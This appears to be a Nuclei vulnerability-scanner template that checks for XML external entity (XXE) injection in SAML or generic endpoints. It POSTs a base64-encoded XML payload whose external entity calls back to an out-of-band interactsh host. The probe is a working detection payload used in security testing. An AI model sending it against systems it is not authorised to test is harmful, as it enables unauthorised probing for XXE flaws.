http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
    - dns
  raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    {{base64(payload)}}

    '
  stop-at-first-match: true
id: basic-xxe-base64
info:
  author: reewardius
  name: XXE SAML
  severity: high
  tags: xxe,generic
variables:
  payload: <?xml version="1.0" ?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://{{interactsh-url}}/x">
    %ext;]><r></r>
